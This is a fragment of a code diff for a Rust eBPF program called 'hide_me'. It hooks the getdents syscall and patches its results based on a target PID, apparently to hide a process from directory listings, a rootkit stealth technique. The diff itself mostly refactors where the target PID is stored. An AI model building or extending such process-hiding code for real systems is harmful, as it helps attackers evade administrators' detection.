@@ -16,18 +16,13 @@ use aya_log_ebpf::info;
 
 use vmlinux::vmlinux::linux_dirent64;
 
-use hide_me_common::pid_to_hide_len;
+use hide_me_common::*;
 
 #[path = "./vmlinux/mod.rs"]
 mod vmlinux;
 
 const PROG_HANDLER: u32 = 0;
 const PROG_PATCHER: u32 = 1;
-const MAX_FILE_LEN: usize = 10;
-
-
-#[no_mangle]
-static pid_to_hide: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];
 
 #[map]
 static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);
@@ -35,10 +30,6 @@ static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);
 #[allow(non_upper_case_globals)]
 #[map]
 static map_buffs: HashMap<usize, u64> = HashMap::<usize, u64>::with_max_entries(8192, 0);
-
-#[allow(non_upper_case_globals)]
-#[map]
-static target_ppid: HashMap<u8, i32> = HashMap::<u8, i32>::with_max_entries(1, 0);
 
 #[allow(non_upper_case_globals)]
 #[map]
@@ -54,13 +45,12 @@ pub fn hide_me(ctx: TracePointContext) -> u32 {
 }
 
 fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
-    unsafe {
-        info!(&ctx, "target_ppid_len is {}", pid_to_hide_len);
-    }
-    let the_target_ppid = unsafe { target_ppid.get(&0) };
+    let the_target_ppid = unsafe { target_ppid };
 
-    if the_target_ppid.is_none() {
-        return Err(0);
+    info!(&ctx, "target_ppid: {}", the_target_ppid);
+
+    if the_target_ppid == 0 {
+        return Ok(0);
     }
 
     let pid_tgid = bpf_get_current_pid_tgid() as usize;
